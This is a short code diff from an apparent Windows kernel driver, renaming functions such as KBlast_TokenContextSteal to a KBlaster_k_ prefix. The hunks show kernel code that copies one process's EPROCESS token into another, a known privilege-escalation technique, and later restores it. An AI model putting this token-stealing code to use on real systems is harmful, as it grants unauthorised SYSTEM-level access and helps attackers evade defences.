@@ -3,7 +3,7 @@
 
 PVOID tokenRestore = 0;
 
-NTSTATUS KBlast_TokenPrivilegeManipulate(int processID, PRIVILEGES_ACTION prOption)
+NTSTATUS KBlaster_k_TokenPrivilegeManipulate(int processID, PRIVILEGES_ACTION prOption)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	PEPROCESS pEprocess = 0;
@@ -47,7 +47,7 @@ NTSTATUS KBlast_TokenPrivilegeManipulate(int processID, PRIVILEGES_ACTION prOpti
 
 
 
-NTSTATUS KBlast_TokenContextSteal(int processID, int targetProcessID)
+NTSTATUS KBlaster_k_TokenContextSteal(int processID, int targetProcessID)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	PEPROCESS pEprocess = 0, pTargetEprocess = 0;
@@ -59,8 +59,8 @@ NTSTATUS KBlast_TokenContextSteal(int processID, int targetProcessID)
 		status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
 		if (NT_SUCCESS(status))
 		{
-			pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlast_GetWindowsVersion()]);
-			pTargetToken = (PEX_FAST_REF)((ULONG_PTR)pTargetEprocess + EPROCESS_TOKEN_OFFSET[KBlast_GetWindowsVersion()]);
+			pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
+			pTargetToken = (PEX_FAST_REF)((ULONG_PTR)pTargetEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
 			tokenRestore = pToken->Value;
 			pToken->Value = pTargetToken->Value;
 
@@ -75,7 +75,7 @@ NTSTATUS KBlast_TokenContextSteal(int processID, int targetProcessID)
 }
 
 
-NTSTATUS KBlast_TokenContextRestore(int processID)
+NTSTATUS KBlaster_k_TokenContextRestore(int processID)
 {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	PEPROCESS pEprocess = 0;
@@ -84,7 +84,7 @@ NTSTATUS KBlast_TokenContextRestore(int processID)
 	status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
 	if (NT_SUCCESS(status))
 	{
-		pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlast_GetWindowsVersion()]);
+		pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
 		if (tokenRestore != 0)
 		{
 			pToken->Value = tokenRestore;
